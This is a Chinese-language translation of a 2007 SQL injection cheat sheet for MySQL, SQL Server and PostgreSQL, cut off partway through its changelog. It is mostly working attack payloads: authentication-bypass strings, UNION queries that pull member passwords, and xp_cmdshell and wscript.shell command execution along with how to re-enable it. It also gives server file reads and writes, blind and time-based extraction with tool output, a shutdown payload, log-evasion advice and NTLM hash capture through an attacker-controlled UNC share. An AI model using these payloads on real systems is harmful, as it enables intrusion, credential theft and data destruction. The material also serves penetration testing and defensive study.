<p><code>0xHEXNUMBER</code>(SM)</p>
<p>(HEXNUMBER:16进制数）<br>
你能这样使用16进制数：</p>
<ul>
<li></li>
</ul>
<pre><code>`` SELECT CHAR(0x66) ``(S)
</code></pre>
<ul>
<li></li>
</ul>
<pre><code>`` SELECT 0x5045 ``(M) (这不是一个整数，而会是一个16进制字符串）
</code></pre>
<ul>
<li></li>
</ul>
<pre><code>`` SELECT 0x50 + 0x45 ``(M) (现在这是整数了)
</code></pre>
<!-- raw HTML omitted -->
<p>与字符串相关的操作。这对于构造一个不含有引号，用于绕过或探测数据库都非常的有用。</p>
<!-- raw HTML omitted -->
<ul>
<li></li>
</ul>
<p><code>+</code>(S)</p>
<p><code>SELECT login + '-' + password FROM members</code></p>
<ul>
<li></li>
</ul>
<p><code>||</code> (*MO)</p>
<p><code>SELECT login || '-' || password FROM members</code></p>
<p>*<strong>关于MySQL的&quot;||“</strong><br>
这个仅在ANSI模式下的MySQL执行，其他情况下都会当成'逻辑操作符'并返回一个0。更好的做法是使用<code>CONCAT()</code>函数。</p>
<ul>
<li></li>
</ul>
<p><code>CONCAT(str1, str2, str3, ...)</code>(M)</p>
<p>连接参数里的所有字符串<br>
例：<code>SELECT CONCAT(login, password) FROM members</code></p>
<!-- raw HTML omitted -->
<p>有很多使用字符串的方法，但是这几个方法是一直可用的。使用<code>CHAR()</code>(MS)和<code>CONCAT()</code>(M)来生成没有引号的字符串</p>
<ul>
<li></li>
</ul>
<p><code>0x457578</code> (M) - 16进制编码的字符串</p>
<p><code>SELECT 0x457578</code></p>
<p>这在MySQL中会被当做字符串处理</p>
<ul>
<li></li>
</ul>
<p>在MySQL中使用16进制字符串的一个简单方式：<br>
<code>SELECT CONCAT('0x',HEX('c:\\boot.ini'))</code></p>
<ul>
<li></li>
</ul>
<p>在MySQL中使用<code>CONCAT()</code>函数：<br>
<code>SELECT CONCAT(CHAR(75),CHAR(76),CHAR(77))</code> (M)</p>
<p>这会返回&rsquo;KLM&rsquo;</p>
<ul>
<li></li>
</ul>
<p><code>SELECT CHAR(75)+CHAR(76)+CHAR(77)</code> (S)</p>
<p>这会返回&rsquo;KLM&rsquo;</p>
<!-- raw HTML omitted -->
<ul>
<li></li>
</ul>
<p><code>SELECT LOAD_FILE(0x633A5C626F6F742E696E69)</code> (M)</p>
<p>这会显示__c:\boot.ini__的内容</p>
<!-- raw HTML omitted -->
<ul>
<li></li>
</ul>
<p><code>ASCII()</code> (SMP)</p>
<p>返回最左边字符的ASCII码的值。这是一个用于盲注的重要函数。</p>
<p>例：<code>SELECT ASCII('a')</code></p>
<ul>
<li></li>
</ul>
<p><code>CHAR()</code> (SM)</p>
<p>把整数转换为对应ASCII码的字符</p>
<p>例：<code>SELECT CHAR(64)</code></p>
<!-- raw HTML omitted -->
<p>通过union你能跨表执行查询。最简单的，你能注入一个查询使得它返回另一个表的内容。<br>
<code>SELECT header, txt FROM news UNION ALL SELECT name, pass FROM members</code></p>
<p>这会把news表和members表的内容合并返回。</p>
<p>另一个例子：<br>
<code>' UNION SELECT 1, 'anotheruser', 'doesnt matter', 1--</code></p>
<!-- raw HTML omitted -->
<p>当你使用Union来注入的时候，经常会遇到一些错误，这是由于不同的语言的设置（表的设置、字段设置、表或数据库的设置等等）。这些办法对于解决那些问题都挺有用的，尤其是当你处理日文，俄文，土耳其文的时候你会就会见到他们的。</p>
<ul>
<li></li>
</ul>
<p>使用 <code>COLLATE SQL_Latin1_General_Cp1254_CS_AS</code>(S)</p>
<p>或者其它的什么语句，具体的自己去查SQL Server的文档。<br>
例：<code>SELECT header FROM news UNION ALL SELECT name COLLATE SQL_Latin1_General_Cp1254_CS_AS FROM members</code></p>
<ul>
<li></li>
</ul>
<p><code>Hex()</code>(M)</p>
<p>百试百灵~</p>
<!-- raw HTML omitted -->
<p><em>SQL注入101式</em>(大概是原文名字吧？),登陆小技巧</p>
<ul>
<li><code>admin' --</code></li>
<li><code>admin' #</code></li>
<li><code>admin'/*</code></li>
<li><code>' or 1=1--</code></li>
<li><code>' or 1=1#</code></li>
<li><code>' or 1=1/*</code></li>
<li><code>') or '1'='1--</code></li>
<li><code>') or ('1'='1--</code></li>
<li>….</li>
<li>以不同的用户登陆 (SM*) <code>' UNION SELECT 1, 'anotheruser', 'doesnt matter', 1--</code></li>
</ul>
<p>*<em>旧版本的MySQL不支持union</em></p>
<!-- raw HTML omitted -->
<p>如果应用是先通过用户名，读取密码的MD5，然后和你提供的密码的MD5进行比较，那么你就需要一些额外的技巧才能绕过验证。你可以把一个已知明文的MD5哈希和它的明文一起提交，使得程序不使用从数据库中读取的哈希，而使用你提供的哈希进行比较。</p>
<!-- raw HTML omitted -->
<blockquote>
<p>用户名：<code>admin</code></p>
<p>密码：<code>1234 ' AND 1=0 UNION ALL SELECT 'admin','81dc9bdb52d04dc20036dbd8313ed055</code></p>
</blockquote>
<p>其中<code>81dc9bdb52d04dc20036dbd8313ed055 = MD5(1234)</code></p>
<!-- raw HTML omitted -->
<!-- raw HTML omitted -->
<ul>
<li><code>' HAVING 1=1 --</code></li>
<li><code>' GROUP BY table.columnfromerror1 HAVING 1=1 --</code></li>
<li><code>' GROUP BY table.columnfromerror1, columnfromerror2 HAVING 1=1 --</code></li>
<li>……</li>
<li><code>' GROUP BY table.columnfromerror1, columnfromerror2,columnfromerror(n) HAVING 1=1 --</code></li>
<li>直到它不再报错，就算搞定了</li>
</ul>
<!-- raw HTML omitted -->
<p>通过ORDER BY来探测字段数能够加快union注入的速度。</p>
<ul>
<li><code>ORDER BY 1--</code></li>
<li><code>ORDER BY 2--</code></li>
<li>……</li>
<li><code>ORDER BY N--</code></li>
<li>一直到它报错为止，最后一个成功的数字就是字段数。</li>
</ul>
<!-- raw HTML omitted -->
<p><strong>提示：</strong></p>
<ul>
<li>
<p>经常给__UNION__配上__ALL__使用，因为经常会有相同数值的字段，而缺省情况下UNION都会尝试返回唯一值(records with distinct)</p>
</li>
<li>
<p>如果你每次查询只能有一条记录，而你不想让原本正常查询的记录占用这宝贵的记录位，你可以使用<code>-1</code>或者根本不存在的值来搞定原查询（前提是注入点在WHERE里）。</p>
</li>
<li>
<p>在UNION中使用NULL，对于大部分数据类型来说这样都比瞎猜字符串、日期、数字之类的来得强</p>
<ul>
<li>盲注的时候要小心判断错误是来自应用的还是来自数据库的。因为像ASP.NET就经常会在你使用NULL的时候抛出错误（因为开发者们一般都没想到用户名的框中会出现NULL）</li>
</ul>
</li>
</ul>
<!-- raw HTML omitted -->
<ul>
<li></li>
</ul>
<p><code>' union select sum(columntofind) from users--</code> (S)</p>
<pre><code>  Microsoft OLE DB Provider for ODBC Drivers error '80040e07' 
  [Microsoft][ODBC SQL Server Driver][SQL Server]The sum or average aggregate operation cannot take a **varchar** data type as an argument. 
</code></pre>
<p>如果没有返回错误说明字段是__数字类型__</p>
<ul>
<li></li>
</ul>
<p>同样的，你可以使用<code>CAST()</code>和<code>CONVERT()</code></p>
<ul>
<li>
<p><code>SELECT * FROM Table1 WHERE id = -1 UNION ALL SELECT null, null, NULL, NULL, convert(image,1), null, null,NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULl, NULL--</code></p>
</li>
<li>
<p><code>11223344) UNION SELECT NULL,NULL,NULL,NULL WHERE 1=2 –-</code></p>
<p>没报错 - 语法是正确的。 这是MS SQL Server的语法。 继续。</p>
</li>
<li>
<p><code>11223344) UNION SELECT 1,NULL,NULL,NULL WHERE 1=2 –-</code></p>
<p>没报错 – 第一个字段是<code>integer</code>类型。</p>
</li>
<li>
<p><code>11223344) UNION SELECT 1,2,NULL,NULL WHERE 1=2 --</code></p>
<p>报错 – 第二个字段不是<code>integer</code>类型</p>
</li>
<li>
<p><code>11223344) UNION SELECT 1,’2’,NULL,NULL WHERE 1=2 –-</code></p>
<p>没报错 – 第二个字段是<code>string</code>类型。</p>
</li>
<li>
<p><code>11223344) UNION SELECT 1,’2’,3,NULL WHERE 1=2 –-</code></p>
<p>报错 – 第三个字段不是<code>integer</code></p>
</li>
<li>
<p>……</p>
<pre><code>Microsoft OLE DB Provider for SQL Server error '80040e07' 
Explicit conversion from data type int to image is not allowed.
</code></pre>
</li>
</ul>
<p><strong>你在遇到union错误之前会先遇到convert()错误</strong>，所以先使用convert()再用union</p>
<!-- raw HTML omitted -->
<p><code>'; insert into users values( 1, 'hax0r', 'coolpass', 9 )/*</code></p>
<!-- raw HTML omitted -->
<!-- raw HTML omitted -->
<p>数据库的版本。这是个常量，你能把它当做字段来SELECT，而且不需要提供表名。同样的你也可以用在INSERT/UPDATE语句里面，甚至是函数里面。</p>
<p><code>INSERT INTO members(id, user, pass) VALUES(1, ''+SUBSTRING(@@version,1,10) ,10)</code></p>
<!-- raw HTML omitted -->
<p>把文件内容插入到表中。如果你不知道应用目录你可以去__读取IIS metabase file__(_仅IIS 6_)(_%systemroot%\system32\inetsrv\MetaBase.xml_)然后在里面找到应用目录。</p>
<ol>
<li>新建一个表foo(<code>line varchar(8000)</code>)</li>
<li><code>BULK INSERT foo FROM 'c:\inetpub\wwwroot\login.asp'</code></li>
<li>DROP了临时表，重复另一个文件</li>
</ol>
<!-- raw HTML omitted -->
<p>写入文件。这个功能需要登录<br>
<code>bcp &quot;SELECT * FROM test..foo&quot; queryout c:\inetpub\wwwroot\runcommand.asp -c -Slocalhost -Usa -Pfoobar</code></p>
<!-- raw HTML omitted -->
<p>由于ActiveX的支持，你能在SQL Server中使用VBS/WSH</p>
<pre><code>declare @o int 
exec sp_oacreate 'wscript.shell', @o out 
exec sp_oamethod @o, 'run', NULL, 'notepad.exe'
</code></pre>
<blockquote>
<p>Username: <code>'; declare @o int exec sp_oacreate 'wscript.shell', @o out exec sp_oamethod @o, 'run', NULL, 'notepad.exe' --</code></p>
</blockquote>
<!-- raw HTML omitted -->
<p>众所周知的技巧，SQL Server 2005默认是关闭的。你需要admin权限</p>
<p><code>EXEC master.dbo.xp_cmdshell 'cmd.exe dir c:'</code></p>
<p>用ping简单的测试一下，用之前先检查一下防火墙和嗅探器。</p>
<p><code>EXEC master.dbo.xp_cmdshell 'ping '</code></p>
<p>如果有错误，或者union或者其他的什么，你都不能直接读到结果。</p>
<!-- raw HTML omitted -->
<ul>
<li></li>
</ul>
<p>Error Messages</p>
<p><code>master..sysmessages</code></p>
<ul>
<li></li>
</ul>
<p>Linked Servers</p>
<p><code>master..sysservers</code></p>
<ul>
<li></li>
</ul>
<p>Password (2000和2005版本的都能被破解，这俩的加密算法很相似)</p>
<p>SQL Server 2000: masters..sysxlogins</p>
<p>SQL Server 2005 : sys.sql_logins</p>
<!-- raw HTML omitted -->
<ol>
<li></li>
</ol>
<pre><code>命令执行 (xp\_cmdshell) 
</code></pre>
<p>​ <br>
​ <br>
<code>exec master..xp_cmdshell 'dir'</code></p>
<p>​ <br>
2.</p>
<pre><code>注册表操作 (xp\_regread)
</code></pre>
<p>​ <br>
​ <br>
1.   xp_regaddmultistring
2.   xp_regdeletekey
3.   xp_regdeletevalue
4.   xp_regenumkeys
5.   xp_regenumvalues
6.   xp_regread
7.   xp_regremovemultistring
8.</p>
<pre><code>    xp\_regwrite 
</code></pre>
<p>​     <br>
​     <br>
exec xp_regread HKEY_LOCAL_MACHINE, &lsquo;SYSTEM\CurrentControlSet       \Services\lanmanserver\parameters&rsquo;, &lsquo;nullsessionshares&rsquo;
exec xp_regenumvalues HKEY_LOCAL_MACHINE, &lsquo;SYSTEM       \CurrentControlSet  \Services\snmp\parameters\validcommunities&rsquo;</p>
<p>​     <br>
​ <br>
​ <br>
​ <br>
3.</p>
<pre><code>管理服务(xp\_servicecontrol)
</code></pre>
<p>​ <br>
4.</p>
<pre><code>媒体(xp\_availablemedia)
</code></pre>
<p>​ <br>
5.</p>
<pre><code>ODBC 资源 (xp\_enumdsn)
</code></pre>
<p>​ <br>
6.</p>
<pre><code>登录 (xp\_loginconfig)
</code></pre>
<p>​ <br>
7.</p>
<pre><code>创建Cab文件 (xp\_makecab)
</code></pre>
<p>​ <br>
8.</p>
<pre><code>域名列举 (xp\_ntsec\_enumdomains)
</code></pre>
<p>​ <br>
9.</p>
<pre><code>杀进程 (need PID) (xp\_terminate\_process)
</code></pre>
<p>​ <br>
10.</p>
<pre><code>新建进程 (_实际上你想干嘛都行_) 
</code></pre>
<p>​ <br>
​ <br>
sp_addextendedproc ‘xp_webserver’, ‘c:\temp\x.dll’
exec xp_webserver</p>
<p>​ <br>
11.</p>
<pre><code>写文件进UNC或者内部路径 (sp\_makewebtask)
</code></pre>
<p>​</p>
<!-- raw HTML omitted -->
<p><code>SELECT * FROM master..sysprocesses /*WHERE spid=@@SPID*/</code></p>
<p><code>DECLARE @result int; EXEC @result = xp_cmdshell 'dir *.exe';IF (@result = 0) SELECT 0 ELSE SELECT 1/0</code></p>
<p>HOST_NAME()<br>
IS_MEMBER (Transact-SQL)</p>
<p>IS_SRVROLEMEMBER (Transact-SQL)</p>
<p>OPENDATASOURCE (Transact-SQL)</p>
<p><code>INSERT tbl EXEC master..xp_cmdshell OSQL /Q&quot;DBCC SHOWCONTIG&quot;</code></p>
<p>OPENROWSET (Transact-SQL) - <a href="http://msdn2.microsoft.com/en-us/library/ms190312.aspx">http://msdn2.microsoft.com/en-us/library/ms190312.aspx</a></p>
<p>你不能在 SQL Server 的Insert查询里使用子查询(sub select).</p>
<!-- raw HTML omitted -->
<p><code>SELECT id, product FROM test.test t LIMIT 0,0 UNION ALL SELECT 1,'x'/*,10 ;</code></p>
<p>如果注入点在LIMIT的第二个参数处，你可以把它注释掉或者使用union注入。</p>
<!-- raw HTML omitted -->
<p>如果你真的急了眼，<code>';shutdown --</code></p>
<!-- raw HTML omitted -->
<p>默认情况下，SQL Server 2005中像xp_cmdshell以及其它危险的内置程序都是被禁用的。如果你有admin权限，你就可以启动它们。</p>
<pre><code>EXEC sp_configure 'show advanced options',1 
RECONFIGURE

EXEC sp_configure 'xp_cmdshell',1 
RECONFIGURE
</code></pre>
<!-- raw HTML omitted -->
<!-- raw HTML omitted -->
<p><code>SELECT name FROM sysobjects WHERE xtype = 'U'</code></p>
<!-- raw HTML omitted -->
<p><code>SELECT name FROM syscolumns WHERE id =(SELECT id FROM sysobjects WHERE name = 'tablenameforcolumnnames')</code></p>
<!-- raw HTML omitted -->
<ul>
<li></li>
</ul>
<p>修改WHERE，使用__NOT IN__或者__NOT EXIST__<br>
<code>... WHERE users NOT IN ('First User', 'Second User')</code><br>
<code>SELECT TOP 1 name FROM members WHERE NOT EXIST(SELECT TOP 0 name FROM members)</code> – 这个好用</p>
<ul>
<li></li>
</ul>
<p>脏的不行的小技巧</p>
<p><code>SELECT * FROM Product WHERE ID=2 AND 1=CAST((Select p.name from (SELECT (SELECT COUNT(i.id) AS rid FROM sysobjects i WHERE i.id&amp;lt;=o.id) AS x, name from sysobjects o) as p where p.x=3) as int</code></p>
<p><code>Select p.name from (SELECT (SELECT COUNT(i.id) AS rid FROM sysobjects i WHERE xtype='U' and i.id&amp;lt;=o.id) AS x, name from sysobjects o WHERE o.xtype = 'U') as p where p.x=21</code></p>
<!-- raw HTML omitted -->
<p><code>';BEGIN DECLARE @rt varchar(8000) SET @rd=':' SELECT @rd=@rd+' '+name FROM syscolumns WHERE id =(SELECT id FROM sysobjects WHERE name = 'MEMBERS') AND name&amp;gt;@rd SELECT @rd AS rd into TMP_SYS_TMP end;--</code></p>
<p><strong>详情请参考：<a href="http://ferruh.mavituna.com/makale/fast-way-to-extract-data-from-error-based-sql-injections/">Fast way to extract data from Error Based SQL Injections</a></strong></p>
<!-- raw HTML omitted -->
<!-- raw HTML omitted -->
<p>一个经过完整而优秀开发的应用一般来说你是__看不到错误提示的__，所以你是没办法从Union攻击和错误中提取出数据的</p>
<p><strong>一般盲注</strong>，你不能在页面中看到响应，但是你依然能同个HTTP状态码得知查询的结果</p>
<p><strong>完全盲注</strong>，你无论怎么输入都完全看不到任何变化。你只能通过日志或者其它什么的来注入。虽然不怎么常见。</p>
<p>在一般盲注下你能够使用__If语句__或者__WHERE查询注入___(一般来说比较简单)_，在完全盲注下你需要使用一些延时函数并分析响应时间。为此在SQL Server中你需要使用__WAIT FOR DELAY ‘0:0:10’__，在MySQL中使用__BENCHMARK()__，在PostgreSQL中使用__pg_sleep(10)__，以及在ORACLE中的一些__PL/SQL小技巧__。</p>
<!-- raw HTML omitted -->
<p>以下的输出来自一个真实的私人盲注工具在测试一个SQL Server后端应用并且遍历表名这些请求完成了第一个表的第一个字符。由于是自动化攻击，SQL查询比实际需求稍微复杂一点。其中我们使用了二分搜索来探测字符的ASCII码。</p>
<p>__TRUE__和__FALSE__标志代表了查询返回了true或false</p>
<pre><code>TRUE : SELECT ID, Username, Email FROM [User]WHERE ID = 1 AND ISNULL(ASCII(SUBSTRING((SELECT TOP 1 name FROM sysObjects WHERE xtYpe=0x55 AND name NOT IN(SELECT TOP 0 name FROM sysObjects WHERE xtYpe=0x55)),1,1)),0)&amp;gt;78-- 

FALSE : SELECT ID, Username, Email FROM [User]WHERE ID = 1 AND ISNULL(ASCII(SUBSTRING((SELECT TOP 1 name FROM sysObjects WHERE xtYpe=0x55 AND name NOT IN(SELECT TOP 0 name FROM sysObjects WHERE xtYpe=0x55)),1,1)),0)&amp;gt;103-- 

TRUE : SELECT ID, Username, Email FROM [User]WHERE ID = 1 AND ISNULL(ASCII(SUBSTRING((SELECT TOP 1 name FROM sysObjects WHERE xtYpe=0x55 AND name NOT IN(SELECT TOP 0 name FROM sysObjects WHERE xtYpe=0x55)),1,1)),0) 
FALSE : SELECT ID, Username, Email FROM [User]WHERE ID = 1 AND ISNULL(ASCII(SUBSTRING((SELECT TOP 1 name FROM sysObjects WHERE xtYpe=0x55 AND name NOT IN(SELECT TOP 0 name FROM sysObjects WHERE xtYpe=0x55)),1,1)),0)&amp;gt;89-- 

TRUE : SELECT ID, Username, Email FROM [User]WHERE ID = 1 AND ISNULL(ASCII(SUBSTRING((SELECT TOP 1 name FROM sysObjects WHERE xtYpe=0x55 AND name NOT IN(SELECT TOP 0 name FROM sysObjects WHERE xtYpe=0x55)),1,1)),0) 
FALSE : SELECT ID, Username, Email FROM [User]WHERE ID = 1 AND ISNULL(ASCII(SUBSTRING((SELECT TOP 1 name FROM sysObjects WHERE xtYpe=0x55 AND name NOT IN(SELECT TOP 0 name FROM sysObjects WHERE xtYpe=0x55)),1,1)),0)&amp;gt;83-- 

TRUE : SELECT ID, Username, Email FROM [User]WHERE ID = 1 AND ISNULL(ASCII(SUBSTRING((SELECT TOP 1 name FROM sysObjects WHERE xtYpe=0x55 AND name NOT IN(SELECT TOP 0 name FROM sysObjects WHERE xtYpe=0x55)),1,1)),0) 
FALSE : SELECT ID, Username, Email FROM [User]WHERE ID = 1 AND ISNULL(ASCII(SUBSTRING((SELECT TOP 1 name FROM sysObjects WHERE xtYpe=0x55 AND name NOT IN(SELECT TOP 0 name FROM sysObjects WHERE xtYpe=0x55)),1,1)),0)&amp;gt;80-- 

FALSE : SELECT ID, Username, Email FROM [User]WHERE ID = 1 AND ISNULL(ASCII(SUBSTRING((SELECT TOP 1 name FROM sysObjects WHERE xtYpe=0x55 AND name NOT IN(SELECT TOP 0 name FROM sysObjects WHERE xtYpe=0x55)),1,1)),0)
</code></pre>
<p>由于上面__后两个查询都是false__，我们能清楚的知道表名的第一个__字符的ASCII码是80，也就是&quot;P”__。这就是我们通过二分算法来进行盲注的方法。其他已知的方法是一位一位(bit by bit)地读取数据。这些方法在不同条件下都很有效。</p>
<!-- raw HTML omitted -->
<p>首先，只在完全没有提示(really blind)的情况下使用，否则请使用1/0方式通过错误来判断差异。其次，在使用20秒以上的延时时要小心，因为应用与数据库的连接API可能会判定为超时(timeout)。</p>
<!-- raw HTML omitted -->
<p>这就跟<code>sleep</code>差不多，等待特定的时间。通过CPU来让数据库进行等待。</p>
<p><code>WAITFOR DELAY '0:0:10'--</code></p>
<p>你也可以这样用</p>
<p><code>WAITFOR DELAY '0:0:0.51'</code></p>
<!-- raw HTML omitted -->
<ul>
<li>俺是sa吗？<code>if (select user) = 'sa' waitfor delay '0:0:10'</code></li>
<li>ProductID =<code>1;waitfor delay '0:0:10'--</code></li>
<li>ProductID =<code>1);waitfor delay '0:0:10'--</code></li>
<li>ProductID =<code>1';waitfor delay '0:0:10'--</code></li>
<li>ProductID =<code>1');waitfor delay '0:0:10'--</code></li>
<li>ProductID =<code>1));waitfor delay '0:0:10'--</code></li>
<li>ProductID =<code>1'));waitfor delay '0:0:10'--</code></li>
</ul>
<!-- raw HTML omitted -->
<p>一般来说都不太喜欢用这个来做MySQL延时。小心点用因为这会极快地消耗服务器资源。<br>
<code>BENCHMARK(howmanytimes, do this)</code></p>
<!-- raw HTML omitted -->
<ul>
<li></li>
</ul>
<p>俺是root吗？爽！<br>
<code>IF EXISTS (SELECT * FROM users WHERE username = 'root') BENCHMARK(1000000000,MD5(1))</code></p>
<ul>
<li></li>
</ul>
<p>判断表是否存在<br>
<code>IF (SELECT * FROM login) BENCHMARK(1000000,MD5(1))</code></p>
<!-- raw HTML omitted -->
<p>睡眠指定秒数。</p>
<ul>
<li><code>SELECT pg_sleep(10);</code>睡个十秒</li>
</ul>
<!-- raw HTML omitted -->
<!-- raw HTML omitted -->
<p>出于安全原因，SQL Server不会把含有这一选项的查询日志记录进日志中(!)。所以如果你在查询中添加了这一选项，你的查询就不会出现在数据库日志中，当然，服务器日志还是会有的，所以如果可以的话你可以尝试使用POST方法。</p>
<!-- raw HTML omitted -->
<p>这些测试既简单又清晰，适用于盲注和悄悄地搞。</p>
<ol>
<li></li>
</ol>
<pre><code>`` product.asp?id=4 (SMO) ``
</code></pre>
<p>​ <br>
​ <br>
1.   <code>product.asp?id=5-1</code>
2.   <code>product.asp?id=4 OR 1=1</code></p>
<p>​ <br>
​ <br>
2.</p>
<pre><code>`` product.asp?name=Book ``
</code></pre>
<p>​ <br>
​ <br>
1.   <code>product.asp?name=Bo’%2b’ok</code>
2.   <code>product.asp?name=Bo’ || ’ok (OM)</code>
3.   <code>product.asp?name=Book’ OR ‘x’=’x</code></p>
<p>​ <br>
​</p>
<!-- raw HTML omitted -->
<ul>
<li>
<p>子查询只能在MySQL4.1+使用</p>
</li>
<li>
<p>用户</p>
<ul>
<li><code>SELECT User,Password FROM mysql.user;</code></li>
</ul>
</li>
<li>
<p><code>SELECT 1,1 UNION SELECT IF(SUBSTRING(Password,1,1)='2',BENCHMARK(100000,SHA1(1)),0) User,Password FROM mysql.user WHERE User = ‘root’;</code></p>
</li>
<li>
<p><code>SELECT ... INTO DUMPFILE</code></p>
<ul>
<li>把查询写入一个__新文件__中(不能修改已有文件)</li>
</ul>
</li>
<li>
<p>UDF功能</p>
<ul>
<li><code>create function LockWorkStation returns integer soname 'user32';</code></li>
<li><code>select LockWorkStation();</code></li>
<li><code>create function ExitProcess returns integer soname 'kernel32';</code></li>
<li><code>select exitprocess();</code></li>
</ul>
</li>
<li>
<p><code>SELECT USER();</code></p>
</li>
<li>
<p><code>SELECT password,USER() FROM mysql.user;</code></p>
</li>
<li>
<p>admin密码哈希的第一位</p>
<ul>
<li><code>SELECT SUBSTRING(user_password,1,1) FROM mb_users WHERE user_group = 1;</code></li>
</ul>
</li>
<li>
<p>文件读取</p>
<ul>
<li><code>query.php?user=1+union+select+load_file(0x63...),1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1</code></li>
</ul>
</li>
<li>
<p>MySQL读取文件内容</p>
<ul>
<li></li>
</ul>
<p><strong>默认这个功能是没开启的！</strong></p>
<pre><code>  create table foo( line blob ); 
  load data infile 'c:/boot.ini' into table foo; 
  select * from foo;
</code></pre>
</li>
<li>
<p>MySQL里的各种延时</p>
</li>
<li>
<p><!-- raw HTML omitted -->select benchmark( 500000, sha1( &lsquo;test&rsquo; ) );<!-- raw HTML omitted -->
query.php?user=1+union+select+benchmark(500000,sha1 (0x414141)),1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1<!-- raw HTML omitted --></p>
</li>
<li>
<p><code>select if( user() like 'root@%', benchmark(100000,sha1('test')), 'false' );</code></p>
</li>
<li>
<p><strong>遍历数据，暴力猜解</strong></p>
<ul>
<li><code>select if( (ascii(substring(user(),1,1)) &amp;gt;&amp;gt; 7) &amp;amp; 1,benchmark(100000,sha1('test')), 'false' );</code></li>
</ul>
</li>
</ul>
<!-- raw HTML omitted -->
<ul>
<li></li>
</ul>
<p><code>MD5()</code></p>
<p>MD5哈希</p>
<ul>
<li></li>
</ul>
<p><code>SHA1()</code></p>
<p>SHA1哈希</p>
<ul>
<li></li>
</ul>
<p><code>PASSWORD()</code></p>
<ul>
<li></li>
</ul>
<p><code>ENCODE()</code></p>
<ul>
<li></li>
</ul>
<p><code>COMPRESS()</code></p>
<p>压缩数据，在盲注时读取大量数据很好用</p>
<ul>
<li></li>
</ul>
<p><code>ROW_COUNT()</code></p>
<ul>
<li></li>
</ul>
<p><code>SCHEMA()</code></p>
<ul>
<li></li>
</ul>
<p><code>VERSION()</code></p>
<p>跟<code>@@version</code>是一样的</p>
<!-- raw HTML omitted -->
<p>一般来说你在某个地方进行SQL注入并期望它没有过滤非法操作，而这则是一般人注意不到的层面（hidden layer problem）</p>
<blockquote>
<p>Name:<code>' + (SELECT TOP 1 password FROM users ) + '</code></p>
<p>Email : <code>xx@xx.com</code></p>
</blockquote>
<p>如果应用在name表格中使用了不安全的储存方法或步骤，之后它就会把第一个用户的密码写进你的name里面。</p>
<!-- raw HTML omitted -->
<p>这个攻击能够帮助你得到目标SQL服务器的Windows密码，不过你的连接很可能会被防火墙拦截。这能作为一个很有用的入侵测试。我们强制SQL服务器连接我们的WindowsUNC共享并通过抓包软件(Cain &amp; Abel)捕捉NTLM session。</p>
<!-- raw HTML omitted -->
<p><code>bulk insert foo from '\\YOURIPADDRESS\C$\x.txt'</code></p>
<!-- raw HTML omitted -->
<p>因为以下笔记是这几年从各种不同来源手机的，还有一些是个人经验，所以我可能漏掉了一些参考项。如果你肯定我漏了你的或者其他人的资料请<a href="http://ferruh.mavituna.com/iletisim/">给我发邮件</a><em>(ferruh-at-mavituna.com)</em>，我会尽快更新。</p>
<ul>
<li>
<p><strong>各种资料</strong></p>
<ul>
<li><a href="http://www.ngssoftware.com/papers/advanced_sql_injection.pdf">Advanced SQL Injection In SQL Applications</a>, <em>Chris Anley</em></li>
<li><a href="http://www.nextgenss.com/papers/more_advanced_sql_injection.pdf">More Advanced SQL Injection In SQL Applications</a>, <em>Chris Anley</em></li>
<li><a href="http://www.imperva.com/download.asp?id=4">Blindfolded SQL Injection, Ofer Maor</a> – <em>Amichai Shulman</em></li>
<li><a href="http://www.ngssoftware.com/papers/HackproofingMySQL.pdf">Hackproofing MySQL</a>, <em>Chris Anley</em></li>
<li><a href="http://eu.wiley.com/WileyCDA/WileyTitle/productCd-0764578014.html">Database Hacker’s Handbook, David Litchfield</a>, <em>Chris Anley, John Heasman, Bill Grindlay</em></li>
<li><strong>楼上的团队</strong>！</li>
</ul>
</li>
<li>
<p><strong>MSSQL相关</strong></p>
<ul>
<li>MSSQL Operators - <a href="http://msdn2.microsoft.com/en-us/library/aa276846(SQL.80).aspx">http://msdn2.microsoft.com/en-us/library/aa276846(SQL.80).aspx</a></li>
<li>Transact-SQL Reference - <a href="http://msdn2.microsoft.com/en-us/library/aa299742(SQL.80).aspx">http://msdn2.microsoft.com/en-us/library/aa299742(SQL.80).aspx</a></li>
<li>String Functions (Transact-SQL) - <a href="http://msdn2.microsoft.com/en-us/library/ms181984.aspx">http://msdn2.microsoft.com/en-us/library/ms181984.aspx</a></li>
<li>List of MSSQL Server Collation Names - <a href="http://msdn2.microsoft.com/en-us/library/ms180175.aspx">http://msdn2.microsoft.com/en-us/library/ms180175.aspx</a></li>
<li>MSSQL Server 2005 Login Information and some other functions : <a href="http://www.notsosecure.com/">Sumit Siddharth</a></li>
</ul>
</li>
<li>
<p><strong>MySQL相关</strong></p>
<ul>
<li>Comments : <a href="http://dev.mysql.com/doc/">http://dev.mysql.com/doc/</a></li>
<li>Control Flows - <a href="http://dev.mysql.com/doc/refman/5.0/en/control-flow-functions.html">http://dev.mysql.com/doc/refman/5.0/en/control-flow-functions.html</a></li>
<li>MySQL Gotchas - <a href="http://sql-info.de/mysql/gotchas.htm">http://sql-info.de/mysql/gotchas.htm</a></li>
<li><a href="http://www.securiteam.com/securityreviews/5KP0N1PC1W.html">New SQL Injection Concept</a>, <em>Tonu Samuel</em></li>
</ul>
</li>
</ul>
<!-- raw HTML omitted -->
<ul>
<li>
<p>15/03/2007 - Public Release v1.0</p>
</li>
<li>
<p>16/03/2007 - v1.1</p>
<ul>
<li>Links added for some paper and book references</li>
<li>Collation sample added</li>
<li>Some typos fixed</li>
<li>Styles and Formatting improved</li>
<li>New MySQL version and comment samples</li>
<li>PostgreSQL Added to Ascii and legends, pg_sleep() added blind section</li>
<li>Blind SQL Injection section and improvements, new samples</li>
<li>Reference paper added for MySQL comments</li>
</ul>
</li>
<li>
<p>21/03/2007 - v1.2</p>
<ul>
<li>BENCHMARK() sample changed to avoid people DoS their MySQL Servers</li>
<li>More Formatting and Typo</li>
<li>Descriptions for some MySQL Function</li>
</ul>
</li>
<li>
<p>30/03/2007 v1.3</p>
<ul>
<li>Niko pointed out PotsgreSQL and PHP supports stacked queries</li>
<li>Bypassing second MD5 check login screens description and attack added</li>
<li>Mark came with extracting NTLM session idea, added</li>
<li>Detailed Blind SQL Exploitation added</li>
</ul>
</li>
<li>
<p>13/04/2007 v1.4 - Release</p>
<ul>
<li>SQL Server 2005 enabling xp_cmdshell added (trick learned from mark)</li>
